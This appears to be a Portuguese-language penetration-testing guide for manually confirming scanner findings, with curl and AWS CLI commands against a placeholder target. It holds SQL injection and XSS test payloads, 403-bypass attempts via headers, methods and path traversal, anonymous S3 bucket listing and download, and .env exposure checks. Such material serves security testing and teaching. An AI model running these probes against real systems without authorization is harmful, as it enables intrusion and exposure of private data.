## Guia de Validação Manual — Como Confirmar um Achado

> **Scanner encontrou algo? Não acredite cegamente.** Aqui está como confirmar CADA tipo de achado manualmente.

### 1. Como testar SQL Injection básico

**Cenário:** Você encontrou uma URL com parâmetro: `http://evilcorp.com/page?id=5`

```bash
# Teste 1: Adicionar aspas simples (causar erro de SQL)
curl -s "http://evilcorp.com/page?id=5'"
# Se retornar erro de SQL → VULNERÁVEL ✅
# Se retornar 200 normal → provavelmente NÃO é vulnerável

# Teste 2: Boolean-based (true/false)
curl -s "http://evilcorp.com/page?id=5 AND 1=1"  # Deve retornar a página normal
curl -s "http://evilcorp.com/page?id=5 AND 1=2"  # Deve retornar conteúdo diferente
# Se os dois retornos forem DIFERENTES → VULNERÁVEL ✅

# Teste 3: Comentário
curl -s "http://evilcorp.com/page?id=5--"
# Se retornar a página normal (sem erro) → pode ser vulnerável

# Teste 4: Time-based (mais confiável)
curl -s -o /dev/null -w "%{time_total}" "http://evilcorp.com/page?id=5 AND SLEEP(5)"
# Se demorar ~5 segundos → VULNERÁVEL ✅
# Se retornar rápido → NÃO é vulnerável
```

**Output que indica vulnerabilidade:**
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
```
```
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given
```

### 2. Como testar XSS básico

**Cenário:** Você encontrou um campo de busca: `http://evilcorp.com/search?q=teste`

```bash
# Teste 1: Tag de script básica
curl -s "http://evilcorp.com/search?q=<script>alert(1)</script>"
# Se o output contiver <script>alert(1)</script> → pode ser vulnerável

# Teste 2: Verificar se o input é refletido
curl -s "http://evilcorp.com/search?q=TESTEXSS12345" | grep "TESTEXSS12345"
# Se aparecer no output → input é refletido (pré-requisito para XSS)

# Teste 3: Verificar se há sanitização
curl -s "http://evilcorp.com/search?q=<img/src=x onerror=alert(1)>"
# Se aparecer no output sem ser filtrado → VULNERÁVEL ✅

# Teste 4: Verificar Content-Type
curl -sI "http://evilcorp.com/search?q=teste" | grep -i "content-type"
# Se for text/html → XSS é possível
# Se for application/json → XSS é mais difícil
```

**⚠️ IMPORTANTE:** Não execute XSS em produção. Use apenas em labs (PortSwigger, TryHackMe).

### 3. Como confirmar um diretório 403

**Cenário:** Gobuster encontrou `/admin` com status 403.

```bash
# Teste 1: Verificar se é 403 real
curl -I http://evilcorp.com/admin
# 403 Forbidden = proteção real

# Teste 2: Tentar com POST
curl -X POST http://evilcorp.com/admin
# Se retornar 200 → pode ser bypassável

# Teste 3: Tentar com X-Forwarded-For
curl -H "X-Forwarded-For: 127.0.0.1" http://evilcorp.com/admin
# Se retornar 200 → pode ser bypassável

# Teste 4: Tentar com methods diferentes
curl -X PUT http://evilcorp.com/admin
curl -X DELETE http://evilcorp.com/admin
# Se algum retornar 200 → vulnerabilidade

# Teste 5: Tentar path traversal
curl http://evilcorp.com/admin/../
curl http://evilcorp.com/admin%2f
# Se retornar algo diferente → pode ser bypassável
```

### 4. Como confirmar WordPress

```bash
# Teste 1: Verificar generator tag
curl -s http://evilcorp.com | grep -i "generator"
# <meta name="generator" content="WordPress 5.7" /> → confirmado

# Teste 2: Verificar readme
curl -s http://evilcorp.com/readme.html | grep "WordPress"
# Se retornar versão → confirmado

# Teste 3: Verificar xmlrpc
curl -sI http://evilcorp.com/xmlrpc.php
# Se retornar 200 → ativo (pode ser usado para brute force)

# Teste 4: Verificar wp-login
curl -sI http://evilcorp.com/wp-login.php
# Se retornar 200 → login ativo
```

### 5. Como confirmar S3 Bucket exposto

```bash
# Teste 1: Listar bucket
aws s3 ls s3://NOME-BUCKET --no-sign-request
# Se retornar arquivos → EXPUESTO ✅

# Teste 2: Tentar download de arquivo
aws s3 cp s3://NOME-BUCKET/arquivo.txt . --no-sign-request
# Se funcionar → CRÍTICO ✅

# Teste 3: Testar variações do nome
for nome in evilcorp evil-corp evilcorp-prod evilcorp-backup evilcorp-staging; do
    echo "=== $nome ==="
    aws s3 ls s3://$nome --no-sign-request 2>&1
done
```

### 6. Como confirmar Subdomain Takeover

```bash
# Teste 1: Verificar CNAME
dig +short docs.evilcorp.com CNAME
# Se retornar CNAME para serviço externo → suspeito

# Teste 2: Verificar se serviço retorna erro
curl -I http://docs.evilcorp.com
# Se retornar:
# - "NoSuchBucket" → S3 não reclamado ✅
# - "Heroku Error Page" → Heroku não reclamado ✅
# - "GitHub Pages" → GitHub não reclamado ✅
# - "Fastly" → Fastly não reclamado ✅

# Teste 3: Subzy (já feito na Fase 5)
# Se retornou VULNERABLE → confirmado
```

### 7. Como confirmar Headers de Segurança Ausentes

```bash
# Verificar TODOS os headers
curl -sI http://evilcorp.com

# Verificar cada header individualmente
curl -sI http://evilcorp.com | grep -i "x-frame-options"
curl -sI http://evilcorp.com | grep -i "content-security-policy"
curl -sI http://evilcorp.com | grep -i "strict-transport-security"
curl -sI http://evilcorp.com | grep -i "x-content-type-options"
curl -sI http://evilcorp.com | grep -i "x-xss-protection"

# Se NÃO retornar nenhum → MÁ CONFIGURAÇÃO (reportar como MÉDIO)
```

### Tabela de decisão rápida:

| Scanner diz | Você confirma com | É vulnerabilidade? |
|-------------|-------------------|:---:|
| Nikto: `/admin` found | `curl -I http://alvo/admin` | ❌ Não (só existe) |
| Nikto: cookie sem httponly | `curl -sI \| grep set-cookie` | ✅ Sim (MÉDIO) |
| Nuclei: env-exposure | `curl -s http://alvo/.env` | ✅ Sim (CRÍTICO) |
| Nuclei: phpinfo | `curl -s http://alvo/phpinfo.php` | ✅ Sim (MÉDIO) |
| WPScan: plugin vulnerable | Verificar versão do plugin | ✅ Sim (ALTO-CRÍTICO) |
| Nmap: MySQL 3306 open | `nc -v alvo 3306` | ✅ Sim (ALTO) |
| Subzy: VULNERABLE | `curl -I http://sub.alvo` | ✅ Sim (CRÍTICO) |
| S3: bucket listável | `aws s3 ls` | ✅ Sim (CRÍTICO) |
| Gobuster: /backup 403 | `curl http://alvo/backup/` | ❌ Provavelmente não |
| Nmap: vuln script found | Manualmente testar exploit | ⚠️ Depende |

---
